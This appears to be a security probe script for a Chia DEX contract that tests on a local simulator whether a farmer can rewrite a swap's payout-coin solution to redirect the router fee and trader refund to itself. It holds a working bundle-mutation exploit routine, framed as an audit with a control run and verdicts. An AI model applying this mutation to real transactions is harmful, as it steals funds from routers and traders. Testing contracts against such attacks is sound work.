#!/usr/bin/env python3
"""F3 probe: can a farmer rewrite the payout coin's router-fee/trader-refund group
to pay itself, while the trader's requested payment stays intact and the bundle
stays valid, on the REAL Chia simulator?

Run with cwd = contracts (drivers do sys.path.insert(0, ".")):

    cd /home/user/awizardxch/forge-puzzles/contracts
    /tmp/claude-0/-home-user-aWizard-Familiar/f2fdccd5-2d6f-5000-b0d2-2456b85199f8/scratchpad/venv-fp/bin/python \
        /tmp/claude-0/-home-user-aWizard-Familiar/f2fdccd5-2d6f-5000-b0d2-2456b85199f8/scratchpad/sim-f3/sim_f3_payout_redirect.py

Shape: production-lane pool (sim-v14's create_pool), honest CAT->XCH swap through the
offer route lane (forge_v14_offer.settle_swap) with a non-zero router fee_bps so the
output leg carries BOTH a router-fee group and a trader-refund group. CONTROL pushes
the honest bundle. ATTACK rewrites only the payout coin's OFFER_MOD solution.
"""
from __future__ import annotations

import asyncio
import hashlib
import sys
from pathlib import Path

sys.path.insert(0, ".")

from chia.types.blockchain_format.program import Program
from chia.types.coin_spend import make_spend
from chia.wallet.cat_wallet.cat_utils import (
    CAT_MOD, SpendableCAT, construct_cat_puzzle, unsigned_spend_bundle_for_spendable_cats,
)
from chia.wallet.conditions import CreateCoin
from chia.wallet.lineage_proof import LineageProof
from chia.wallet.puzzle_drivers import PuzzleInfo
from chia.wallet.puzzles.singleton_top_layer_v1_1 import SINGLETON_LAUNCHER, SINGLETON_LAUNCHER_HASH
from chia.wallet.trading.offer import OFFER_MOD, OFFER_MOD_HASH, Offer
from chia.types.mempool_inclusion_status import MempoolInclusionStatus
from chia_rs import Coin, G2Element, SpendBundle
from chia_rs.sized_bytes import bytes32
from chia_rs.sized_ints import uint64

import forge_math
import forge_v14_driver as drv
import forge_v14_offer as v14off
from _sim_harness import (CREATE_COIN, IDENTITY, IDENTITY_HASH, SimRejected, Wallet,
                          farm_to_identity, issue_cat, push, sim_and_client, split_xch)

# Reuse the production create_pool / mint_registry lane verbatim from the deploy script.
sys.path.insert(0, str(Path("../scripts").resolve()))
import importlib.util
_spec = importlib.util.spec_from_file_location("simv14", str(Path("../scripts/sim-v14.py").resolve()))
simv14 = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(simv14)

TRADER_PH = bytes32(b"\x77" * 32)   # where the trader asks XCH be paid (and the refund `back`)
ROUTER_PH = bytes32(b"\x66" * 32)   # surplus_ph: the honest router-fee recipient
ATTACKER_PH = bytes32(b"\xee" * 32)  # the farmer paying itself
OFFER_PH = bytes32(OFFER_MOD_HASH)


def log(msg: str = "") -> None:
    print(msg, flush=True)


def build_trader_offer(cat_coin: Coin, cat_lineage: LineageProof, asset: bytes32,
                       gross: int, want_xch: int, salt: int) -> Offer:
    """A real wallet-shaped offer: the trader's REAL CAT coin (anyone-can-spend inner)
    creates the CAT(OFFER_MOD) settlement of `gross` and asserts the announcement of its
    one requested XCH payment of `want_xch` to TRADER_PH. Keyless (IDENTITY), so the
    aggregate signature is empty -- see report note on which spend asserts what."""
    notarized = Offer.notarize_payments(
        {None: [CreateCoin(TRADER_PH, uint64(want_xch), [TRADER_PH])]}, [cat_coin])
    announcements = []
    for a, payments in notarized.items():
        settle = OFFER_MOD_HASH if a is None else construct_cat_puzzle(CAT_MOD, a, OFFER_MOD).get_tree_hash()
        for p in payments:
            msg = Program.to((p.nonce, [p.as_condition_args()])).get_tree_hash()
            announcements.append([63, bytes32(hashlib.sha256(bytes(settle) + bytes(msg)).digest())])
    conditions = [[CREATE_COIN, OFFER_MOD_HASH, int(gross)], *announcements]
    ring = unsigned_spend_bundle_for_spendable_cats(CAT_MOD, [SpendableCAT(
        cat_coin, asset, IDENTITY, Program.to(conditions), lineage_proof=cat_lineage)]).coin_spends
    driver = {asset: PuzzleInfo({"type": "CAT", "tail": "0x" + asset.hex()})}
    return Offer(notarized, SpendBundle(ring, G2Element()), driver)


async def coin_total(client, ph: bytes32, cat_asset: bytes32 | None = None) -> tuple[int, int]:
    """(count, sum) of unspent coins at `ph` (as XCH, or wrapped in `cat_asset`)."""
    target = ph if cat_asset is None else bytes32(
        construct_cat_puzzle(CAT_MOD, cat_asset, Program.to(ph)).get_tree_hash_precalc(ph))
    recs = await client.get_coin_records_by_puzzle_hash(target, include_spent_coins=False)
    return len(recs), sum(int(r.coin.amount) for r in recs)


def mutate_payout_solution(bundle: SpendBundle, payout_coin: Coin, fee_nonce: bytes32,
                           new_fee_ph: bytes32 | None, new_refund_ph: bytes32 | None) -> SpendBundle:
    """Rebuild `bundle` with ONLY the payout coin's OFFER_MOD solution changed: in the
    group whose nonce is the payout coin id (fee + refund), rewrite payment 0 (fee) to
    `new_fee_ph` when given, and payment 1 (refund) to `new_refund_ph` when given. Every
    other coin spend is left byte-identical, so the empty aggregate signature still verifies.
    Returns the mutated bundle and asserts exactly one spend changed."""
    out_spends, changed = [], 0
    for cs in bundle.coin_spends:
        if cs.coin.name() != payout_coin.name():
            out_spends.append(cs)
            continue
        groups = list(Program.from_bytes(bytes(cs.solution)).as_iter())
        new_groups = []
        for g in groups:
            nonce = g.first()
            if nonce.atom is not None and bytes32(nonce.as_atom()) == fee_nonce:
                payments = list(g.rest().as_iter())
                rebuilt = []
                for idx, pay in enumerate(payments):
                    items = list(pay.as_iter())
                    ph = bytes32(items[0].as_atom())
                    amount = items[1].as_int()
                    if idx == 0 and new_fee_ph is not None:
                        ph = new_fee_ph
                    if idx == 1 and new_refund_ph is not None:
                        ph = new_refund_ph
                    rebuilt.append([ph, amount, [ph]])
                new_groups.append(Program.to((fee_nonce, rebuilt)))
                changed += 1
            else:
                new_groups.append(g)
        out_spends.append(make_spend(cs.coin, Program.from_bytes(bytes(cs.puzzle_reveal)),
                                     Program.to(new_groups)))
    assert changed == 1, f"expected to rewrite exactly one group, rewrote {changed}"
    return SpendBundle(out_spends, bundle.aggregated_signature)


async def build_pool_and_offer(sim, client):
    """Fresh chain: farm, issue CAT, create an XCH/CAT pool through the production lane,
    and hand back an honest CAT->XCH swap SettleResult plus the pieces a probe needs."""
    coins = await farm_to_identity(sim, client, blocks=6)
    wallet = Wallet(xch=list(coins), cats={})
    log(f"  farmed {len(coins)} coins, {sum(int(c.amount) for c in coins):,} mojos, peak {sim.block_height}")

    # issue the pool's CAT (reserve + trader's swap input come from the same token)
    funding = wallet.take_xch(1_000_000_000)
    pieces, bundle = split_xch(funding, [500_000_000])
    await push(client, sim, bundle, "split for token issuance")
    asset, minted, lineage, mint_bundle = issue_cat(pieces[0], 60_000_000, salt=0xA7)
    await push(client, sim, mint_bundle, "issue token")
    wallet.cats.setdefault(asset, []).append((minted, lineage))
    log(f"  issued CAT {asset.hex()[:12]}..., peak {sim.block_height}")

    reg = await simv14.mint_registry(sim, client, wallet)
    log(f"  registry {reg.registry.launcher_id.hex()[:16]}, peak {sim.block_height}")

    # order assets canonically: XCH (None -> zeros) sorts before the CAT
    assets = [None, asset]
    order = sorted(range(2), key=lambda i: bytes(32) if assets[i] is None else bytes(assets[i]))
    assets = [assets[i] for i in order]
    reserves = [[50_000_000, 20_000_000][i] for i in order]
    pool = await simv14.create_pool(sim, client, wallet, reg, assets, reserves, [1, 1],
                                    fee_bps=30, protocol_fee_bps=5, label="XCH/CAT F3")
    log(f"  pool created+registered, birth {pool.birth}, reserves {[int(x) for x in pool.state[0]]}")
    i_xch = pool.asset_ids.index(None)
    i_cat = 1 - i_xch

    # honest CAT -> XCH swap: output leg is XCH, so router fee_bps carves a fee group AND
    # leaves a refund group when the trader under-asks beyond the cap.
    fee_bps = 300
    gross_cat = 400_000
    r, w = pool.state[0], pool.weights
    honest = forge_math.swap_output(r[i_cat], r[i_xch], gross_cat, pool.fee_bps, w[i_cat], w[i_xch])
    pfee = honest * pool.protocol_fee_bps // 10_000 + honest * pool.dao_fee_bps // 10_000
    payout = honest - pfee
    fee_cap = payout * fee_bps // 10_000
    refund = 1_000
    want = payout - fee_cap - refund
    assert fee_cap > 0 and refund > 0 and want > 0, (payout, fee_cap, refund, want)
    log(f"  swap math: gross_cat {gross_cat}, honest_xch {honest}, protocol_fee {pfee}, "
        f"payout {payout}, fee_cap(router) {fee_cap}, want(trader) {want}, refund {refund}")

    cat_coin, cat_lineage = wallet.take_cat(asset, gross_cat)
    # give the trader exactly `gross_cat`: split the real CAT coin first
    if int(cat_coin.amount) > gross_cat:
        rest = int(cat_coin.amount) - gross_cat
        ring = unsigned_spend_bundle_for_spendable_cats(CAT_MOD, [SpendableCAT(
            cat_coin, asset, IDENTITY, Program.to([
                [CREATE_COIN, IDENTITY_HASH, gross_cat, [IDENTITY_HASH]],
                [CREATE_COIN, IDENTITY_HASH, rest, [IDENTITY_HASH]],
            ]), lineage_proof=cat_lineage)]).coin_spends
        await push(client, sim, SpendBundle(ring, G2Element()), "split trader CAT")
        inner_ph = construct_cat_puzzle(CAT_MOD, asset, IDENTITY).get_tree_hash()
        trader_coin = Coin(cat_coin.name(), bytes32(inner_ph), uint64(gross_cat))
        trader_lineage = LineageProof(cat_coin.parent_coin_info, IDENTITY_HASH, cat_coin.amount)
    else:
        trader_coin, trader_lineage = cat_coin, cat_lineage

    offer = build_trader_offer(trader_coin, trader_lineage, asset, gross_cat, want, salt=0x31)
    height = sim.block_height
    result = v14off.settle_swap(pool, offer, height, surplus_ph=ROUTER_PH, fee_bps=fee_bps)
    d = result.details
    log(f"  settle_swap ok: router_fee {d['router_fee']} (side {d['router_fee_side']}), "
        f"refund {d['refund']}, requested {d['requested']}")

    # locate the payout coin and the fee/refund nonce (= payout coin id)
    reserve = pool.reserves[i_xch]
    payout_coin = Coin(reserve.coin.name(), OFFER_PH, uint64(payout))
    return {
        "wallet": wallet, "pool": pool, "asset": asset, "offer": offer, "result": result,
        "payout_coin": payout_coin, "fee_nonce": payout_coin.name(),
        "want": want, "fee": fee_cap, "refund": refund, "payout": payout,
    }


async def report_payees(client, asset, tag=""):
    tc, ts = await coin_total(client, TRADER_PH)
    rc, rs = await coin_total(client, ROUTER_PH)
    ac, as_ = await coin_total(client, ATTACKER_PH)
    log(f"  {tag}TRADER xch coins={tc} sum={ts:,} | ROUTER xch coins={rc} sum={rs:,} | "
        f"ATTACKER xch coins={ac} sum={as_:,}")
    return (tc, ts), (rc, rs), (ac, as_)


async def main() -> int:
    log("=" * 78)
    log("PHASE 1 -- CONTROL: push the honest offer-lane bundle")
    log("=" * 78)
    async with sim_and_client() as (sim, client):
        ctx = await build_pool_and_offer(sim, client)
        bundle = ctx["result"].bundle
        status, error = await client.push_tx(bundle)
        log(f"  push honest -> status={status.name} error={error.name if error else None}")
        if status != MempoolInclusionStatus.SUCCESS:
            log("  CONTROL FAILED -- cannot establish the honest baseline; aborting")
            return 2
        await sim.farm_block()
        log("  farmed. Honest payees (fee->ROUTER, refund->TRADER, requested->TRADER):")
        await report_payees(client, ctx["asset"], tag="honest: ")
        fee_rec = await coin_total(client, ROUTER_PH)
        log(f"  CONTROL: router fee coin present at ROUTER_PH = {fee_rec[0] > 0} (sum {fee_rec[1]:,}, "
            f"expected {ctx['fee']:,})")

    log("")
    log("=" * 78)
    log("PHASE 2 -- ATTACK A: fresh chain, redirect BOTH fee and refund to ATTACKER_PH")
    log("=" * 78)
    async with sim_and_client() as (sim, client):
        ctx = await build_pool_and_offer(sim, client)
        mutated = mutate_payout_solution(ctx["result"].bundle, ctx["payout_coin"], ctx["fee_nonce"],
                                         new_fee_ph=ATTACKER_PH, new_refund_ph=ATTACKER_PH)
        # prove non-payout spends are byte-identical
        orig = {cs.coin.name(): bytes(cs.solution) for cs in ctx["result"].bundle.coin_spends}
        identical = all(bytes(cs.solution) == orig[cs.coin.name()]
                        for cs in mutated.coin_spends if cs.coin.name() != ctx["payout_coin"].name())
        log(f"  every non-payout spend byte-identical: {identical}")
        log(f"  aggregate signature unchanged: {bytes(mutated.aggregated_signature) == bytes(ctx['result'].bundle.aggregated_signature)}")
        status, error = await client.push_tx(mutated)
        log(f"  push ATTACK A -> status={status.name} error={error.name if error else None}")
        if status == MempoolInclusionStatus.SUCCESS:
            await sim.farm_block()
            log("  ACCEPTED. Payees after the attack:")
            (_, ts), (_, rs), (ac, as_) = await report_payees(client, ctx["asset"], tag="attack: ")
            log(f"  attacker took {as_:,} (expected fee+refund = {ctx['fee'] + ctx['refund']:,})")
            log(f"  trader's requested XCH still paid: {ts >= ctx['want']} (sum {ts:,}, want {ctx['want']:,})")
            log(f"  router got {rs:,} (expected 0)")
            verdict_a = "CONFIRMED"
        else:
            log(f"  REFUSED by: {error.name if error else 'REJECTED'}")
            verdict_a = "REFUTED"
        log(f"  ATTACK A verdict: {verdict_a}")

    log("")
    log("=" * 78)
    log("PHASE 3 -- ATTACK B (narrower): keep the fee group, redirect only the REFUND")
    log("=" * 78)
    async with sim_and_client() as (sim, client):
        ctx = await build_pool_and_offer(sim, client)
        mutated = mutate_payout_solution(ctx["result"].bundle, ctx["payout_coin"], ctx["fee_nonce"],
                                         new_fee_ph=None, new_refund_ph=ATTACKER_PH)
        status, error = await client.push_tx(mutated)
        log(f"  push ATTACK B -> status={status.name} error={error.name if error else None}")
        if status == MempoolInclusionStatus.SUCCESS:
            await sim.farm_block()
            log("  ACCEPTED. Payees after the attack:")
            (_, ts), (_, rs), (ac, as_) = await report_payees(client, ctx["asset"], tag="attack: ")
            log(f"  router still got its fee: {rs:,} (expected {ctx['fee']:,})")
            log(f"  attacker took the refund: {as_:,} (expected {ctx['refund']:,})")
            log(f"  trader's requested XCH still paid: {ts >= ctx['want']} (sum {ts:,}, want {ctx['want']:,})")
            verdict_b = "CONFIRMED"
        else:
            log(f"  REFUSED by: {error.name if error else 'REJECTED'}")
            verdict_b = "REFUTED"
        log(f"  ATTACK B verdict: {verdict_b}")

    log("")
    log(f"F3 overall: ATTACK A = {verdict_a}, ATTACK B = {verdict_b}")
    return 0


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
